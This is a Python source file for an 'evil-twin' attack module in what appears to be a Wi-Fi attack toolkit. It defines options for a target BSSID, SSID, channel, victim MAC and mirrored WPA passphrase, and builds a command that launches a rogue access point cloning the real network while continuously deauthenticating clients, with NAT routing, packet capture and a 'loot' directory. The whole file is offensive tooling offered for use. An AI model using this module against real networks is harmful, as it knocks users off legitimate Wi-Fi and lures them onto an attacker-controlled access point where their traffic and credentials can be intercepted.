"""attack/evil-twin — rogue AP cloning one SSID + continuous deauth."""

from __future__ import annotations

from wifipi.module import Module
from wifipi.options import OptionSpec


class EvilTwin(Module):
    NAME = "attack/evil-twin"
    CATEGORY = "attack"
    DESCRIPTION = "Rogue AP (hostapd+dnsmasq) that clones SSID + continuous deauth on MON_IFACE."
    OPTIONS = {
        "BSSID":          OptionSpec(required=True,  description="Real AP BSSID to kick victim off.", kind="bssid"),
        "SSID":           OptionSpec(required=True,  description="SSID to clone."),
        "CHANNEL":        OptionSpec(required=True,  description="AP channel.", kind="int"),
        "CLIENT":         OptionSpec(required=False, default=None,
                                     description="Victim MAC (omit to broadcast deauth).", kind="mac"),
        "WPA_PASSPHRASE": OptionSpec(required=False, default=None,
                                     description="Mirror the real AP's password (omit for open rogue)."),
        "UPSTREAM_IFACE": OptionSpec(required=False, default="eth0",
                                     description="Interface NAT is routed through."),
    }
    REQUIRES_TOOLS = ["hostapd", "dnsmasq", "aireplay-ng", "iptables", "tcpdump", "iw"]
    BLOCKING = False
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "evil-twin"

    def build_argv(self, opts: dict) -> list[str]:
        mon = opts.get("MON_IFACE")
        ap = opts.get("AP_IFACE")
        if not mon:
            raise RuntimeError("MON_IFACE not set")
        if not ap:
            raise RuntimeError("AP_IFACE not set — plug in a second USB adapter")
        if mon == ap:
            raise RuntimeError("MON_IFACE and AP_IFACE must be different adapters")
        argv = [
            "python3", "-m", "wifipi.modules.attack._evil_twin_runner",
            "--workdir", opts.get("_WORKDIR", "/tmp/eviltwin"),
            "--ap-iface", ap,
            "--mon-iface", mon,
            "--upstream", opts.get("UPSTREAM_IFACE", "eth0"),
            "--bssid", opts["BSSID"],
            "--ssid", opts["SSID"],
            "--channel", str(opts["CHANNEL"]),
        ]
        if opts.get("CLIENT"):
            argv += ["--client", opts["CLIENT"]]
        if opts.get("WPA_PASSPHRASE"):
            argv += ["--wpa-pass", opts["WPA_PASSPHRASE"]]
        return argv
